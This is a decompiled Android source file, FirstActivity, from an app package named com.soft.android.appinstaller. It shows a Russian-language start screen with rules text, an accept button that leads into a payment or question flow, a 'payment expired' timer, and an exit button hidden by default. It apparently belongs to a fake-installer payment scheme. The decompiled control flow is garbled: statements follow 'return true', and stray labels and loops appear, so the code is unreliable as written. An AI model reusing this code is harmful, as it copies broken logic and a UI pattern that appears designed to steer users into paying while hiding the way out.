package com.soft.android.appinstaller;

import android.app.Activity;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.soft.android.appinstaller.core.Internals;
import com.soft.android.appinstaller.core.TextFinder;

public class FirstActivity
  extends Activity
{
  public static final String LAST_AUTH_TIME = "LAST_AUTH_TIME";
  public static final String PREFS_NAME = "LocalSettings";
  private Button acceptButton;
  private Button rulesButton;
  
  public FirstActivity() {}
  
  boolean isPaymentExpired()
  {
    long l1 = getSharedPreferences("LocalSettings", 0).getLong("LAST_AUTH_TIME", 0L);
    if (l1 == 0L) {}
    long l2;
    do
    {
      return true;
      String str = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.payment.expire", "never");
      if (str.equals("never")) {
        break;
      }
      l2 = Long.parseLong(str);
    } while (System.currentTimeMillis() - l1 > l2 * 3600000L);
    return false;
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903041);
    setTitle("Loading...");
    GlobalConfig.getInstance().init(this);
    OpInfo.getInstance().init(this);
    this.acceptButton = ((Button)findViewById(2131165195));
    this.rulesButton = ((Button)findViewById(2131165194));
    this.rulesButton.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("ui.firstscreen.buttons.rules.caption", this.rulesButton.getText().toString()));
    this.acceptButton.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("ui.firstscreen.buttons.accept.caption", this.acceptButton.getText().toString()));
    paramBundle = (TextView)findViewById(2131165190);
    Object localObject = (TextView)findViewById(2131165192);
    LinearLayout localLinearLayout = (LinearLayout)findViewById(2131165191);
    if ("false".equals(OpInfo.getInstance().getInternals().getOverridableValueForLocation("ui.firstscreen.buttons.exit.enabled", "false")))
    {
      ((TextView)localObject).setVisibility(4);
      localLinearLayout.setVisibility(8);
      if (!GlobalConfig.getInstance().getValue("rulesShow", "onClick").equals("onStartup")) {
        break label293;
      }
      localObject = OpInfo.getInstance().getTextFinder().getRulesTexts();
      if (localObject != null)
      {
        paramBundle.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("extinfo", "") + ((ActivityTexts)localObject).getText());
        paramBundle.setMovementMethod(new ScrollingMovementMethod());
        setTitle(((ActivityTexts)localObject).getTitle());
        this.rulesButton.setText(2131099657);
      }
    }
    label293:
    do
    {
      return;
      ((TextView)localObject).setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("ui.firstscreen.buttons.exit.caption", "Выход"));
      break;
      localObject = OpInfo.getInstance().getTextFinder().getFirstActivityTexts();
    } while (localObject == null);
    paramBundle.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("extinfo", "") + ((ActivityTexts)localObject).getText());
    paramBundle.setMovementMethod(new ScrollingMovementMethod());
    setTitle(((ActivityTexts)localObject).getTitle());
  }
  
  public void onExitClicked(View paramView)
  {
    finish();
  }
  
  public void onNextClicked(View paramView)
  {
    if (isPaymentExpired())
    {
      updateLastAuthTime();
      QuestionActivity.checkNextQuestions(this, this);
      return;
    }
    FlowController.launchFinishActivity(this);
    finish();
  }
  
  public void onRulesClicked(View paramView)
  {
    if (GlobalConfig.getInstance().getValue("rulesShow", "onClick").equals("onStartup")) {
      finish();
    }
    ActivityTexts localActivityTexts;
    do
    {
      return;
      paramView = (TextView)findViewById(2131165190);
      localActivityTexts = OpInfo.getInstance().getTextFinder().getRulesTexts();
    } while (localActivityTexts == null);
    paramView.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("extinfo", "") + localActivityTexts.getText());
    paramView.setMovementMethod(new ScrollingMovementMethod());
    setTitle(localActivityTexts.getTitle());
    this.rulesButton.setVisibility(4);
    this.rulesButton.setText(2131099657);
  }
  
  void updateLastAuthTime()
  {
    SharedPreferences.Editor localEditor = getSharedPreferences("LocalSettings", 0).edit();
    localEditor.putLong("LAST_AUTH_TIME", System.currentTimeMillis());
    localEditor.commit();
  }
}
